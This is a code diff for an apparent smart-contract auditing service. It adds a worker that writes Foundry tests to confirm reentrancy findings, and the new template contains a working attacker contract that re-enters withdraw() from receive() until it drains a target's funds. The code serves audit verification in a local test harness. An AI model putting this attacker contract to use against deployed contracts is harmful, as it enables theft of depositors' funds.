@@ -2,6 +2,7 @@ from __future__ import annotations
 
 import asyncio
 import json
+import re
 import shutil
 import tempfile
 import time
@@ -13,6 +14,7 @@ from wr3_api.domain.enums import Chain, Severity
 from wr3_api.domain.schemas import AuditEvent, AuditRecord, EngineRunSummary, Finding
 from wr3_api.services.artifacts import ArtifactEncryptionRequired, ArtifactVault
 from wr3_api.services.sandbox import SandboxPolicy
+from wr3_api.services.tool_paths import tool_subprocess_env
 
 
 @dataclass(frozen=True)
@@ -143,14 +145,25 @@ class FoundryPocWorker:
             (root / "src" / "Target.sol").write_text(source_with_pragma, encoding="utf-8")
             (root / "foundry.toml").write_text("[profile.default]\nsrc='src'\ntest='test'\n", encoding="utf-8")
 
+            target_name = extract_primary_contract(source_with_pragma)
+            exploit_candidate = pick_exploit_candidate(candidates, source_with_pragma, target_name)
+
             for attempt in range(1, self._max_attempts + 1):
-                test_source = build_foundry_test(candidates, attempt, last_error)
+                test_source = build_foundry_test(
+                    candidates,
+                    attempt,
+                    last_error,
+                    source=source_with_pragma,
+                    target_name=target_name,
+                    exploit_candidate=exploit_candidate,
+                )
                 (root / "test" / "Wr3PoC.t.sol").write_text(test_source, encoding="utf-8")
                 proc = await asyncio.create_subprocess_exec(
                     "forge",
                     "test",
                     "--json",
                     cwd=root,
+                    env=tool_subprocess_env(),
                     stdout=asyncio.subprocess.PIPE,
                     stderr=asyncio.subprocess.PIPE,
                 )
@@ -175,7 +188,8 @@ class FoundryPocWorker:
                     }
                 )
                 if proc.returncode == 0 and is_generated_poc_meaningful(candidates, test_source):
-                    confirmed = [finding.id for finding in candidates[:1]]
+                    target_finding = exploit_candidate or candidates[0]
+                    confirmed = [target_finding.id]
                     break
                 last_error = stderr_text or stdout_text or f"forge_returncode_{proc.returncode}"
 
@@ -224,7 +238,64 @@ def ensure_solidity_pragma(source: str) -> str:
     return "pragma solidity ^0.8.20;\n" + source
 
 
-def build_foundry_test(candidates: list[Finding], attempt: int, last_error: str | None) -> str:
+_REENTRANCY_HINTS = ("reentr", "reentrancy")
+
+
+def extract_primary_contract(source: str) -> str | None:
+    """Name the contract the PoC should instantiate.
+
+    The exploit references the target by name, so prefer the contract whose body
+    holds the vulnerable ``withdraw`` sink over any interface/library declared
+    earlier in the file. Returns None when nothing parseable is present.
+    """
+    names = re.findall(r"\bcontract\s+([A-Za-z_]\w*)", source)
+    if not names:
+        return None
+    for name in names:
+        start = source.find(f"contract {name}")
+        if start != -1 and "withdraw" in source[start : start + 6000]:
+            return name
+    return names[-1]
+
+
+def pick_exploit_candidate(
+    candidates: list[Finding],
+    source: str,
+    target_name: str | None,
+) -> Finding | None:
+    """Choose a finding we can build a *real*, self-checking exploit for.
+
+    Today that means the canonical reentrancy drain: a ``deposit``/``withdraw``
+    pair whose external call fires before the balance is zeroed. When no
+    candidate matches that shape we return None, the worker falls back to the
+    inert compile-only harness, and the finding stays unconfirmed — we never
+    fabricate a confirmation we cannot demonstrate.
+    """
+    if not target_name:
+        return None
+    lowered = source.lower()
+    if "function deposit" not in lowered or "function withdraw" not in lowered:
+        return None
+    if "call{value" not in lowered.replace(" ", ""):
+        return None
+    for finding in candidates:
+        haystack = f"{finding.summary} {finding.taxonomy.wr3_category} {finding.description}".lower()
+        if any(hint in haystack for hint in _REENTRANCY_HINTS):
+            return finding
+    return None
+
+
+def build_foundry_test(
+    candidates: list[Finding],
+    attempt: int,
+    last_error: str | None,
+    *,
+    source: str = "",
+    target_name: str | None = None,
+    exploit_candidate: Finding | None = None,
+) -> str:
+    if exploit_candidate is not None and target_name:
+        return build_reentrancy_exploit(target_name, attempt, exploit_candidate)
     finding = candidates[0] if candidates else None
     summary = (finding.summary if finding else "No candidate").replace("*/", "* /")
     category = finding.taxonomy.wr3_category if finding else "none"
@@ -244,6 +315,75 @@ import "../src/Target.sol";
 contract Wr3PoCTest {{
     function testWr3HarnessCompiles() public pure {{
         require(bytes("{category}").length > 0, "wr3-empty-category");
+    }}
+}}
+"""
+
+
+def build_reentrancy_exploit(target_name: str, attempt: int, finding: Finding) -> str:
+    """Generate a Foundry test that genuinely drains a reentrant contract.
+
+    An honest depositor seeds the pool, then an attacker contract re-enters
+    ``withdraw`` until the contract is empty. ``forge test`` exits 0 only when
+    the drain actually succeeds, so a passing run is real proof of
+    exploitability rather than a stub. The ``WR3_CONFIRMED_EXPLOIT_ASSERTION``
+    marker signals to the worker that this harness is a confirming exploit, not
+    the inert compile probe. If the target is not in fact reentrant the
+    assertions revert, ``forge`` returns non-zero, and nothing is confirmed.
+    """
+    safe_summary = finding.summary.replace("*/", "* /")[:200]
+    return f"""// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+// wr3 reentrancy PoC attempt {attempt}
+// finding: {safe_summary}
+import "../src/Target.sol";
+
+interface IWr3Vm {{
+    function deal(address who, uint256 newBalance) external;
+}}
+
+contract Wr3ReentrancyAttacker {{
+    {target_name} private target;
+    uint256 private stake;
+
+    constructor({target_name} _target) {{
+        target = _target;
+    }}
+
+    function attack() external payable {{
+        stake = msg.value;
+        target.deposit{{value: msg.value}}();
+        target.withdraw();
+    }}
+
+    receive() external payable {{
+        if (address(target).balance >= stake && stake > 0) {{
+            target.withdraw();
+        }}
+    }}
+}}
+
+contract Wr3PoCTest {{
+    IWr3Vm private constant vm = IWr3Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+
+    function testWr3ReentrancyDrain() public {{
+        {target_name} target = new {target_name}();
+        vm.deal(address(this), 100 ether);
+
+        // Honest depositors fund the pool.
+        uint256 pool = 5 ether;
+        target.deposit{{value: pool}}();
+
+        // Attacker stakes a single unit and re-enters until the pool is empty.
+        Wr3ReentrancyAttacker attacker = new Wr3ReentrancyAttacker(target);
+        uint256 stake = 1 ether;
+        attacker.attack{{value: stake}}();
+
+        // WR3_CONFIRMED_EXPLOIT_ASSERTION: the attacker withdrew strictly more
+        // than it staked, i.e. it stole other depositors' funds via reentrancy.
+        require(address(attacker).balance > stake, "wr3: reentrancy did not profit");
+        require(address(target).balance < pool, "wr3: victim pool not drained");
     }}
 }}
 """
